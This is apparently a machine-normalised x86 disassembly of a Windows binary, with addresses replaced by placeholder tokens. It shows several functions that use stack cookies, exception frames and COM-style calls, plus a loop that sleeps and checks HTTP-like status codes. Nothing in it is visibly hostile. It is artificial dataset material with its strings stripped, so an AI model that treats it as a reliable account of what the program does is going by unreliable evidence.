lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_1006a560
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fc18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1005d090
mov eax [ ebp + 0x8 ]
push eax
push edi
lea ecx [ ebp - 0x34 ]
push ecx
push ebx
mov [ ebp - 0x4 ] ebx
call sub_1001b530
add esp 0x10
cmp eax 0xffffffd6
jne r-xdata
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push r--data
mov ecx esi
mov [ esi ] bl
call sub_1005d090
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
push eax
call sub_10062fc5
mov edx [ ebp + 0x8 ]
push edx
push edi
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x30 ] eax
call sub_1001b530
mov edi [ ebp - 0x30 ]
add esp 0x14
test eax eax
jne r-xdata
push edi
call sub_1005b4d5
add esp 0x4
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_100172f0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_1005d090
call sub_10065045
add esp 0x4
sub_1006a680
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x70 ] eax
mov eax [ eax + 0x1c ]
lea esi [ ebp - 0x5c ]
push esi
xor ebx ebx
mov edi edx
mov [ ebp - 0x5c ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0xdc ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x5c ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x60 ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov [ ebp - 0x6c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xd6
call sub_1000a6f0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x5c ]
lea esi [ ebp - 0x64 ]
push esi
mov [ ebp - 0x64 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xc8
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x70 ]
lea eax [ ebp - 0x68 ]
push eax
push edx
mov [ ebp - 0x68 ] ebx
call sub_100625a0
mov esi [ ebp - 0x68 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x6c ]
inc ecx
mov [ ebp - 0x6c ] ecx
cmp ecx [ ebp - 0x60 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push esi
call sub_1004c1c0
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
push esi
call sub_10016870
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0xea
jmp r-xdata
push esi
call sub_10016870
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_1000a6f0
sub_1006a7e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080651
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x198 ] eax
cmp [ eax + 0xec ] ebx
jne r-xdata
push ebx
push r--data
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x1b4 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0xa8 ] 0xf
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xbc ] bl
call sub_1005d090
cmp [ ebp + 0x10 ] 0x2
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov edi [ ebp - 0x1b4 ]
lea esp [ esp ]
push ebx
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
call sub_1005d090
push 0x8
lea eax [ ebp - 0x180 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1005ceb0
mov edi [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x74 ] ebx
lea esi [ ebp - 0x190 ]
sete al
xor ecx ecx
cmp al bl
sete cl
add ecx 0x6
push ecx
call sub_10042df0
mov [ ebp - 0x4 ] 0x3
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
cmp edi ebx
je r-xdata
push esi
lea eax [ ebp - 0x190 ]
call sub_100657d0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0xd8 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1003b4a6
mov eax 0x43
jmp r-xdata
mov ecx [ ebp - 0xbc ]
push ecx
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x198 ]
mov ecx [ edx + 0xec ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ebp - 0x1a8 ]
push edx
lea edx [ ebp - 0x1a4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x19c ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
mov ecx [ ebp - 0x1a8 ]
mov esi eax
mov eax [ ebp - 0x1a4 ]
inc edi
cmp eax 0x12e
je r-xdata
push 0xdac
call [ Sleep@IAT ]
push edi
push esi
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x1a0 ] eax
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
mov [ ebp - 0x191 ] 0x1
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0x12c ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
cmp esi ebx
jne r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x1a8 ] ebx
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
push 0x3
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
cmp edi 0x5
jg r-xdata
cmp eax 0xc8
je r-xdata
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0x110 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
cmp [ ebp - 0x191 ] 0x1
jne r-xdata
cmp eax 0x12e
jne r-xdata
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x8c ] 0xf
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x7
push 0x1
lea ecx [ ebp - 0xa0 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_1003b4a6
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
push r--data
push r--data
jmp r-xdata
xor eax eax
mov edx [ ebp - 0xbc ]
push edx
call sub_10065045
add esp 0x4
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0xa0 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1003b4a6
call sub_1005be50
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
push 0x1
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x1b0 ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0x148 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x38 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x4c ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
mov edx [ ebp - 0x198 ]
push eax
push edx
lea edi [ ebp - 0x148 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x198 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x1c4 ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0x164 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xb
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0x164 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0xe0 ] 0xf
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x74 ] ebx
je r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x1a0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov edi eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x18c ]
mov ecx [ ebp - 0x190 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0x30 ]
push r--data
push edx
call sub_10051900
add esp 0xc
push eax
lea ecx [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xf
call sub_100172f0
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10040f60
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_10065045
add esp 0x4
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0xf4 ]
call sub_1001ad10
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push r--data
call sub_1003b4a6
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_1002a5c0
mov [ ebp - 0x1c0 ] eax
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x19c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x14
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x1c
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x1bc ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x17
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x38
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x1b0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x54
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x1c4 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x70
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x1b8 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1f
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x20
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0x8c
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
cmp [ ebp - 0x74 ] ebx
je r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
lea edi [ ebp - 0x190 ]
call sub_10005d00
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x25
call sub_100172f0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov ecx [ ebp - 0x1c0 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x22
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x23
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x24
mov ecx [ ebp - 0x18c ]
sub ecx [ ebp - 0x190 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x190 ]
push 0xffffffff
push ebx
add ecx 0xa8
push esi
call sub_10040f60
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1003b4a6
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x19c ] ecx
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_10065045
add esp 0x4
mov edi 0xf
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xf4 ] bl
cmp [ ebp - 0x150 ] esi
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0xac ]
mov [ ebp - 0x1a0 ] edx
cmp [ ebp - 0xe0 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xe
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x150 ] edi
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x164 ] bl
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov ecx [ ebp - 0x164 ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x68 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] ebx
